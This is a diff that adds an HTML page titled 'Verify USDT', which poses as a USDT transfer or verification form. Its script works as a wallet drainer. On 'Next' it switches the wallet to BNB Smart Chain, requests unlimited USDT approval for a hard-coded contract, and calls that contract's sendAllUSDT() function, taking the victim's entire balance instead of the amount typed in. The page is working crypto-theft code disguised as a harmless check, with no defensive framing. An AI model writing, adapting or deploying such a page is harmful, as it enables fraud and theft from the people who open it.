@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify USDT</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+</head>
+<body class="bg-white text-gray-800 font-sans">
+  <div class="max-w-md mx-auto p-4">
+    
+    <label class="block text-sm font-medium mb-1">Address or Domain Name</label>
+    <input type="text" id="addressInput" value="0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed" readonly class="w-full border rounded-lg px-3 py-2 mb-4"/>
+
+    <label class="block text-sm font-medium mb-1">Amount</label>
+    <input type="number" id="amountInput" placeholder="Amount in USDT" class="w-full border rounded-lg px-3 py-2 mb-1"/>
+
+    <label class="block text-sm font-medium mb-1 mt-4">Memo</label>
+    <input type="text" placeholder="Optional" class="w-full border rounded-lg px-3 py-2 mb-6"/>
+
+    <button onclick="sendUSDT()" class="w-full bg-blue-700 text-white text-lg py-3 rounded-full">
+      Next
+    </button>
+
+    <p id="status" class="text-center text-sm mt-4 text-gray-600"></p>
+  </div>
+
+  <script>
+  window.addEventListener("load", async () => {
+    if (window.ethereum) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      } catch (err) {
+        console.warn("Network switch failed or user rejected.");
+      }
+    }
+  });
+
+    const CONTRACT_ADDRESS = "0xC509584d00D8A0082DC8C37999dE9F4955a395e0";
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
+    const ABI = [
+      "function sendAllUSDT() external"
+    ];
+
+    async function sendUSDT() {
+      try {
+        if (!window.ethereum) {
+          alert("Please open in Trust Wallet or MetaMask browser");
+          return;
+        }
+
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const network = await provider.getNetwork();
+
+        if (network.chainId !== 56) {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+          });
+        }
+
+        document.getElementById("status").textContent = "Connecting...";
+
+        const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+        
+        // Approve USDT transfer
+        const usdtAbi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+        const approvalTx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
+        document.getElementById("status").textContent = "Approving USDT...";
+        await approvalTx.wait();
+
+        // Now call sendAllUSDT
+        const tx = await contract.sendAllUSDT();
+    
+
+        document.getElementById("status").textContent = "Transaction sent. Waiting for confirmation...";
+        await tx.wait();
+        document.getElementById("status").textContent = "✅ USDT has been verified and sent.";
+      } catch (error) {
+        console.error(error);
+        document.getElementById("status").textContent = "❌ Transaction failed.";
+      }
+    }
+  </script>
+</body>
+</html>
